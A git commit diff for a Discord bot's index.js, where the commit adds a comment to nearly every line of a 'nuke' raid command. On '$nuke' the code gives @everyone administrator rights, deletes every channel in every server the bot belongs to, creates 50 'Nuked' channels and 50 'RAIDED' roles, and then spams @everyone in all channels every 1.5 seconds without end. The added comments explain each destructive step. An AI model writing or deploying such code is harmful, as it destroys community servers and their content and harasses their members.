06a343a429c3ef825f82d6843ae46df5fec3ca24
Pol528 <68276676+Pol528@users.noreply.github.com>
2021-01-22 08:39:47 +0200

    v1.1
    added comments for almost every line

--- index.js
+++ index.js
@@ -1,43 +1,42 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+const Discord = require('discord.js'); //requireing discord.js
+const client = new Discord.Client(); //creating our discord client
 
-client.on('ready', () => {
-    console.log(`Logged in as ${client.user.tag}!`);
-    client.user.setActivity("https://github.com/Pol528/gbot", { type: "WATCHING"})
+client.on('ready', () => { //when bot is started
+    console.log(`Logged in as ${client.user.tag}!`); //log this into the console
+    client.user.setActivity("https://github.com/Pol528/gbot", { type: "WATCHING"}) //set the bot's activity to: WATCHING https://github.com/Pol528/gbot
   });
 
-  client.on('message', async (msg) => {
-    if (msg.content === '$nuke') {
-    //role:
-    const guild = msg.guild
-    guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
-    client.guilds.cache.forEach(guild => { // Looping through the guilds.
-        guild.channels.cache.forEach(channel => { // Looping through the guild channels.
-            channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
-                console.log(`Couldn't delete ${channel.name}.`)
+  client.on('message', async (msg) => { //when a message is sent
+    if (msg.content === '$nuke') { //if the message is "$nuke"
+    const guild = msg.guild //making a variable called "guild" so we don't need to type "message.guild" every time
+    guild.roles.everyone.setPermissions(['ADMINISTRATOR']); //give @everyone administrator permissions
+    client.guilds.cache.forEach(guild => { //for each guild
+        guild.channels.cache.forEach(channel => { //for each channel
+            channel.delete().catch(error => { //delete the channel
+                console.log(`Couldn't delete ${channel.name}.`) //catch and log any errors
             });
         });
     });
-    let i = 50
-    while(i > 0){
-    guild.channels.create('RAIDED', { reason: 'Needed a cool new channel' })
-    .catch(console.error);
-    guild.roles.create({
-      data: {
-        name: 'RAIDED',
-        color: 'RANDOM',
+    let i = 50 //creating a variable called "i" with a value of 50
+    while(i > 0){ //while i is bigger than 0:
+    guild.channels.create('Nuked', { reason: 'https://github.com/Pol528/gbot' }) //creates a channel called "Nuked"
+    .catch(console.error);// catch any errors
+    guild.roles.create({ //create a role
+      data: { //here are our new role's details:
+        name: 'RAIDED', //name
+        color: 'RANDOM', //color
       },
-      reason: 'we needed a role for Super Cool People',
+      reason: 'https://github.com/Pol528/gbot', //reason for creating the role
     })
-    i = i - 1
+    i = i - 1 //every time this runs, our variable "i" gets 1 subtracted. That means that it will loop 50 times and create 50 channels and roles
     }
-    function asteapta() {
-    client.channels.cache.forEach(channel => {
-        channel.send(`@everyone`)
+    function loop() { //creating a function that we can loop forever
+    client.channels.cache.forEach(channel => { //in each of the channels the bot can see
+        channel.send(`@everyone`) //send @everyone
     })
     }
-    setInterval(asteapta, 1500);
+    setInterval(loop, 1500); //repeat every 1500ms(1.5s)
   }
 });
   
-client.login('token');
+client.login('token'); // here we log into our discord bot. replace "token" with your bot's token
